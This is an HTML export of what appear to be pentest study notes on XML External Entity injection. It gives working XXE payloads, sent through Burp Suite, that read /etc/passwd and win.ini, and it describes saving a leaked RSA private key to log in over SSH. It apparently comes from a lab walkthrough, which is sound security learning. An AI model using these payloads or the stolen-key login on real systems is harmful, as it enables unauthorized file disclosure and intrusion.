<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XML External Entities</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>XML External Entities</h1><br/><p>XEE or XXE</p><p></p><p>Run with burpsuite.</p><p></p><p>Lets try to read /etc/passwd in different ways. For Windows you could try to read:</p><p></p><p>C:\windows\system32\drivers\etc\hosts</p><p>In this first case notice that SYSTEM &quot;file:///etc/passwd&quot; will also work.</p><p></p><p>&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</p><p>&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &quot;/etc/passwd&quot;&gt; ]&gt;</p><p>&lt;data&gt;&amp;example;&lt;/data&gt;</p><p></p><p></p><p>Considering that the target is running a version of Windows, we will be using c:/windows/win.ini file in</p><p>order to test out the exploit&#39;s validity. In BurpSuite, send the request to the Repeater module by right-</p><p>clicking on the request and clicking Send to Repeater or by pressing the CTRL + R combination on your</p><p>keyboard. Then, switch to the Repeater tab at the top of the BurpSuite window and change the XML data</p><p>section of the request to the following:</p><p></p><p>&lt;?xml version=&quot;1.0&quot;?&gt;</p><p>&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///c:/windows/win.ini&#39;&gt;]&gt;</p><p>&lt;order&gt;</p><p>&lt;quantity&gt;</p><p>3</p><p>&lt;/quantity&gt;</p><p>&lt;item&gt;</p><p><strong>&amp;test;</strong></p><p>&lt;/item&gt;</p><p>&lt;address&gt;</p><p>17th Estate, CA</p><p>&lt;/address&gt;</p><p>&lt;/order&gt;</p><p></p><p></p><p><img src="images/45-1.png" alt="images/45-1.png" /></p><p></p><p>The output of the win.ini file on the target itself is dispalyed in our response message, which proves that</p><p>the XML External Entity vulnerability is present.</p><p></p><p>Example:</p><p></p><p><img src="images/45-2.png" alt="images/45-2.png" /></p><p></p><p>The RSA key is printed out in the output, from where it can be placed in a local file on your machine named</p><p>id_rsa , which you can later use to connect to the target at any point in time. Pick a folder to create the file</p><p>in and run the commands below.</p><p></p><p><img src="images/45-3.png" alt="images/45-3.png" /></p><p></p><p>Next, copy the RSA key present in the Response in BurpSuite and paste it into the id_rsa file using the text</p><p>editor of your choice. It&#39;s also important to set the right privileges for the id_rsa file so as to be accepted</p><p>by your SSH client. The commands below will achieve and verify this.</p><p></p><p><img src="images/45-4.png" alt="images/45-4.png" /></p><p></p></div>
</body>
</html>
